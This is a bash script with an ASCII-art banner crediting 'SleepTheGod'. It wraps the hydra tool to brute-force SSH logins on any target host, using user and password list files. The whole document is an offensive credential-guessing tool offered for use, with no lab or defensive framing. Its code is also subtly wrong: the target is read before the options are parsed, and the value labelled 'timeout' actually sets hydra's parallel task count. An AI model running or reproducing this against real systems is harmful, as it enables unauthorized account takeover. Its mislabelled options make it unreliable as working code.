 █████████   █████████  █████   █████    ███████████  ███████████   █████  █████ ███████████ ██████████      
 ███░░░░░███ ███░░░░░███░░███   ░░███    ░░███░░░░░███░░███░░░░░███ ░░███  ░░███ ░█░░░███░░░█░░███░░░░░█      
░███    ░░░ ░███    ░░░  ░███    ░███     ░███    ░███ ░███    ░███  ░███   ░███ ░   ░███  ░  ░███  █ ░       
░░█████████ ░░█████████  ░███████████     ░██████████  ░██████████   ░███   ░███     ░███     ░██████         
 ░░░░░░░░███ ░░░░░░░░███ ░███░░░░░███     ░███░░░░░███ ░███░░░░░███  ░███   ░███     ░███     ░███░░█         
 ███    ░███ ███    ░███ ░███    ░███     ░███    ░███ ░███    ░███  ░███   ░███     ░███     ░███ ░   █      
░░█████████ ░░█████████  █████   █████    ███████████  █████   █████ ░░████████      █████    ██████████      
 ░░░░░░░░░   ░░░░░░░░░  ░░░░░   ░░░░░    ░░░░░░░░░░░  ░░░░░   ░░░░░   ░░░░░░░░      ░░░░░    ░░░░░░░░░░       
 
 
 
   █████████               █████              █████    ███████████                                            
  ███░░░░░███             ░░███              ░░███    ░░███░░░░░███                                           
 ███     ░░░   ██████   ███████   ██████   ███████     ░███    ░███ █████ ████                                
░███          ███░░███ ███░░███  ███░░███ ███░░███     ░██████████ ░░███ ░███                                 
░███         ░███ ░███░███ ░███ ░███████ ░███ ░███     ░███░░░░░███ ░███ ░███                                 
░░███     ███░███ ░███░███ ░███ ░███░░░  ░███ ░███     ░███    ░███ ░███ ░███                                 
 ░░█████████ ░░██████ ░░████████░░██████ ░░████████    ███████████  ░░███████                                 
  ░░░░░░░░░   ░░░░░░   ░░░░░░░░  ░░░░░░   ░░░░░░░░    ░░░░░░░░░░░    ░░░░░███                                 
                                                                     ███ ░███                                 
                                                                    ░░██████                                  
                                                                     ░░░░░░                                   
  █████████  ████                              ███████████ █████                 █████████               █████
 ███░░░░░███░░███                             ░█░░░███░░░█░░███                 ███░░░░░███             ░░███ 
░███    ░░░  ░███   ██████   ██████  ████████ ░   ░███  ░  ░███████    ██████  ███     ░░░   ██████   ███████ 
░░█████████  ░███  ███░░███ ███░░███░░███░░███    ░███     ░███░░███  ███░░███░███          ███░░███ ███░░███ 
 ░░░░░░░░███ ░███ ░███████ ░███████  ░███ ░███    ░███     ░███ ░███ ░███████ ░███    █████░███ ░███░███ ░███ 
 ███    ░███ ░███ ░███░░░  ░███░░░   ░███ ░███    ░███     ░███ ░███ ░███░░░  ░░███  ░░███ ░███ ░███░███ ░███ 
░░█████████  █████░░██████ ░░██████  ░███████     █████    ████ █████░░██████  ░░█████████ ░░██████ ░░████████
 ░░░░░░░░░  ░░░░░  ░░░░░░   ░░░░░░   ░███░░░     ░░░░░    ░░░░ ░░░░░  ░░░░░░    ░░░░░░░░░   ░░░░░░   ░░░░░░░░ 
                                     ░███                                                                     
                                     █████                                                                    
                                    ░░░░░                                                                     
 
 
#!/bin/bash
 
# Check if necessary tools are installed
if ! command -v hydra &> /dev/null
then
    echo "hydra could not be found, please install it to use this script."
    exit
fi
 
# Default values
SSH_PORT=22
TIMEOUT=5
USER_LIST="users.lst"
PASS_LIST="pass.lst"
TARGET="$1"
 
# Usage function
usage() {
    echo "Usage: $0 <target>"
    echo "Optional parameters:"
    echo "  -p <port>                SSH port (default: 22)"
    echo "  -U <user list file>      File containing list of usernames (default: users.lst)"
    echo "  -P <password list file>  File containing list of passwords (default: pass.lst)"
    echo "  -t <timeout>             Timeout in seconds (default: 5)"
    exit 1
}
 
# Parse command-line options
while getopts ":p:U:P:t:" opt; do
  case ${opt} in
    p )
      SSH_PORT=$OPTARG
      ;;
    U )
      USER_LIST=$OPTARG
      ;;
    P )
      PASS_LIST=$OPTARG
      ;;
    t )
      TIMEOUT=$OPTARG
      ;;
    \? )
      echo "Invalid option: $OPTARG" 1>&2
      usage
      ;;
    : )
      echo "Invalid option: $OPTARG requires an argument" 1>&2
      usage
      ;;
  esac
done
shift $((OPTIND -1))
 
# Check if target is provided
if [ -z "${TARGET}" ]; then
    usage
fi
 
# Run Hydra to perform the brute force attack
echo "Starting brute-force attack on $TARGET..."
hydra -t $TIMEOUT -V -f -L $USER_LIST -P $PASS_LIST -s $SSH_PORT ssh://$TARGET
